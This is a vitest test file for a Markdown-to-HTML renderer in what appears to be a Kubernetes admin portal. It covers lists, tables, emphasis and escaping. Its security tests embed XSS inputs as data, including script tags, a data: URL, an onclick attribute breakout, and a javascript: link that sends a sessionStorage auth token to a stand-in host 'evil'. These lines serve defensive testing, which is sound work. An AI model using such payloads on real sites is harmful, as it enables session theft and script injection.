// Markdown renderer smoke tests (legacy renderMarkdown parity): the
// escape-first contract is the security-critical part.
import { describe, expect, it } from "vitest";
import { renderMarkdown } from "../markdown";

describe("renderMarkdown", () => {
  it("escapes HTML before introducing markup", () => {
    const html = renderMarkdown("<script>alert('x')</script>");
    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;script&gt;");
  });

  it("escapes quotes so attribute contexts cannot be broken out of", () => {
    const html = renderMarkdown('say "hi" it\'s fine');
    expect(html).not.toContain('"hi"');
    expect(html).toContain("&quot;hi&quot;");
    expect(html).toContain("&#39;");
  });

  it("renders bold and inline code", () => {
    const html = renderMarkdown("**bold** and `code`");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("<code>code</code>");
  });

  it("renders fenced code blocks", () => {
    const html = renderMarkdown("```bash\nkubectl get pods\n```");
    expect(html).toContain('<pre><code class="lang-bash">kubectl get pods</code></pre>');
  });

  it("adds rel=noreferrer to links", () => {
    const html = renderMarkdown("[docs](https://example.com)");
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('href="https://example.com"');
  });

  it("refuses javascript: links (rendered as plain text)", () => {
    // Walkthrough-review finding: a javascript: URL with no parentheses
    // passes the link capture and could exfiltrate sessionStorage tokens.
    const html = renderMarkdown(
      "[run](javascript:location='https://evil/?t='+sessionStorage['luban.portal.authSession'])",
    );
    expect(html).not.toContain("href=");
    expect(html).toContain("run");
  });

  it("refuses data: links (rendered as plain text)", () => {
    const html = renderMarkdown("[x](data:text/html,<script>alert(1)</script>)");
    expect(html).not.toContain("href=");
  });

  it("neutralizes quote-based attribute breakout inside link targets", () => {
    const html = renderMarkdown('[x](https://a" onclick="alert(1))');
    expect(html).not.toContain(' onclick="alert(1)');
    // The double quote lands inside the attribute as &quot;.
    expect(html).toContain("https://a&quot;");
  });

  it("renders a GFM table as one table with a thead header row", () => {
    // Walkthrough finding: the line-by-line port dropped the separator but
    // left a blank line, splitting header and body into two stacked tables
    // that rendered disconnected. One block must yield one <table>.
    const html = renderMarkdown(
      "| POD | STATUS |\n| --- | --- |\n| web-ui | Running |",
    );
    expect(html.match(/<table>/g)?.length).toBe(1);
    expect(html).toContain("<thead><tr><th>POD</th><th>STATUS</th></tr></thead>");
    expect(html).toContain("<tbody><tr><td>web-ui</td><td>Running</td></tr></tbody>");
    expect(html).not.toContain("---");
  });

  it("supports alignment markers in table separators", () => {
    const html = renderMarkdown("| a | b |\n|:---|---:|\n| 1 | 2 |");
    expect(html.match(/<table>/g)?.length).toBe(1);
    expect(html).toContain("<th>a</th>");
    expect(html).toContain("<td>1</td>");
  });

  it("renders flat unordered bullets as one list", () => {
    const html = renderMarkdown("- one\n- two");
    expect(html).toBe("<ul><li>one</li><li>two</li></ul>");
  });

  it("nests indented sub-bullets instead of dropping them to plain text", () => {
    // v0.18.1 live-check finding: indented bullets rendered as literal
    // "- text" paragraphs at the left edge, without bullets or indent.
    const html = renderMarkdown(
      "- Next steps:\n  - Verify the new pod settles into a stable Running state\n  - Investigate the root cause of the restarts",
    );
    expect(html).toBe(
      "<ul><li>Next steps:<ul>" +
        "<li>Verify the new pod settles into a stable Running state</li>" +
        "<li>Investigate the root cause of the restarts</li>" +
        "</ul></li></ul>",
    );
  });

  it("renders indented bullets without a parent item as a top-level list", () => {
    const html = renderMarkdown(
      "You can either:\n  - Restart the pod\n  - Pull the old pod logs",
    );
    expect(html).toContain("<ul><li>Restart the pod</li><li>Pull the old pod logs</li></ul>");
    expect(html).toContain("<p>You can either:</p>");
    expect(html).not.toContain("- Restart");
  });

  it("wraps ordered items in <ol> so numbering renders", () => {
    const html = renderMarkdown("1. First step\n2. Second step");
    expect(html).toBe("<ol><li>First step</li><li>Second step</li></ol>");
  });

  it("nests an unordered list under an ordered item", () => {
    const html = renderMarkdown("1. Triage\n   - Check the pod status\n2. Report");
    expect(html).toBe(
      "<ol><li>Triage<ul><li>Check the pod status</li></ul></li><li>Report</li></ol>",
    );
  });

  it("keeps list content escaped (no markup injection via items)", () => {
    const html = renderMarkdown("- <script>alert(1)</script>");
    expect(html).toContain("<li>&lt;script&gt;alert(1)&lt;/script&gt;</li>");
  });

  it("keeps intra-word underscores literal in tool identifiers", () => {
    // v0.27.3 live-test finding: the model writes the sanitized tool
    // names (dots→underscores), and the old emphasis pass ate the
    // underscore pair, rendering "k8sdeletepod".
    const html = renderMarkdown("I called k8s_delete_pod to restart the pod.");
    expect(html).toContain("k8s_delete_pod");
    expect(html).not.toContain("<em>");
  });

  it("protects inline code spans from the emphasis passes", () => {
    const html = renderMarkdown("Run `k8s_get_pod_logs` next.");
    expect(html).toContain("<code>k8s_get_pod_logs</code>");
    expect(html).not.toContain("<em>");
  });

  it("protects fenced code content from heading and emphasis passes", () => {
    const html = renderMarkdown("```bash\n# not a heading\nsome_snake_case=1\n* not a bullet\n```");
    expect(html).toContain("# not a heading");
    expect(html).toContain("some_snake_case=1");
    expect(html).not.toContain("<h1>");
    expect(html).not.toContain("<li>");
    expect(html).not.toContain("<em>");
  });

  it("still renders underscore emphasis with non-word context", () => {
    const html = renderMarkdown("this is _important_ and __urgent__ now");
    expect(html).toContain("<em>important</em>");
    expect(html).toContain("<strong>urgent</strong>");
  });

  it("keeps asterisk emphasis and links inside list items working", () => {
    const html = renderMarkdown("- *starred* item with [docs](https://example.com)");
    expect(html).toContain("<li><em>starred</em> item with");
    expect(html).toContain('href="https://example.com"');
  });

  // SPEC-052 skill-viewer finding: real skill bodies wrap item text onto
  // indented continuation lines and blank-separate ordered items, which the
  // old column-0-only list pass split into one single-item list per marker
  // (so every number rendered "1") while orphaning the wrapped text.
  it("folds a wrapped continuation line into its list item", () => {
    const html = renderMarkdown(
      "1. First line of the step\n   wrapped continuation of the step",
    );
    expect(html).toBe(
      "<ol><li>First line of the step wrapped continuation of the step</li></ol>",
    );
  });

  it("keeps blank-separated ordered items in one continuously numbered list", () => {
    const html = renderMarkdown("1. First step\n\n2. Second step\n\n3. Third step");
    expect(html.match(/<ol>/g)?.length).toBe(1);
    expect(html).toBe(
      "<ol><li>First step</li><li>Second step</li><li>Third step</li></ol>",
    );
  });

  it("handles loose items that also wrap, without leaking bare text", () => {
    const html = renderMarkdown(
      "1. First step with a wrapped\n   continuation line\n\n2. Second step",
    );
    expect(html.match(/<ol>/g)?.length).toBe(1);
    expect(html.match(/<li>/g)?.length).toBe(2);
    expect(html).toContain("First step with a wrapped continuation line");
    expect(html).not.toContain("</ol>   ");
    expect(html).not.toContain("<p>");
  });

  it("nests a sub-bullet under a multi-line item", () => {
    const html = renderMarkdown(
      "1. Step one\n   continued here\n   - sub point\n2. Step two",
    );
    expect(html).toBe(
      "<ol><li>Step one continued here<ul><li>sub point</li></ul></li><li>Step two</li></ol>",
    );
  });

  it("ends a list at a blank line before a non-indented paragraph", () => {
    const html = renderMarkdown("- item one\n  wrapped\n\nA following paragraph.");
    expect(html).toContain("<ul><li>item one wrapped</li></ul>");
    expect(html).toContain("<p>A following paragraph.</p>");
  });

  it("soft-wraps consecutive prose lines into one flowing paragraph", () => {
    // The old line-by-line pass emitted one <p> per source line, shattering a
    // wrapped paragraph into short blocks that left the right margin empty.
    const html = renderMarkdown(
      "Automate the password reset workflow. This is a\nreal-life scenario that an operator runs\nthrough the admin portal UI.",
    );
    expect(html).toBe(
      "<p>Automate the password reset workflow. This is a real-life scenario that an operator runs through the admin portal UI.</p>",
    );
  });

  it("keeps distinct paragraphs separate on a blank line", () => {
    const html = renderMarkdown("First paragraph line\nwrapped here.\n\nSecond paragraph.");
    expect(html.match(/<p>/g)?.length).toBe(2);
    expect(html).toContain("<p>First paragraph line wrapped here.</p>");
    expect(html).toContain("<p>Second paragraph.</p>");
  });

  it("returns empty string for empty input", () => {
    expect(renderMarkdown("")).toBe("");
  });
});
